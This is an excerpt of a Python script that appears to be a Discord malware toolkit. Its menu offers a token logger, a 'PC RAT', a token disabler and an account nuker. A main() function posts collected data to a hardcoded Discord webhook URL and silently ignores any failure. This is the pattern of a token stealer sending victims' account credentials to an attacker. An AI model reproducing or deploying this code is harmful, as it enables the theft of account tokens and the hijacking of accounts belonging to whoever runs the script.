...
print("██████╦╝███████╗╚█████╔╝╚█████╔╝██████╔╝██║░░██║███████╗██████╔╝")
print("╚═════╝░╚══════╝░╚════╝░░╚════╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═════╝░")
print("1 Token logger")
print("2 Token generator")
print("3 PC RAT")
print("5 Token Disabler")
print("6 Account/MassBan/Nuker")
print("7 Coming Soon")
input("Option:")
time.sleep(2)
os.system ("cls")
...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/936857528288034887/OO_HYZEFYpy2B_U66hAhDjm2eWgzGbbHbVa1GbwOHL6p--EM88xjLgRRdDz0sSe0PNmc", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
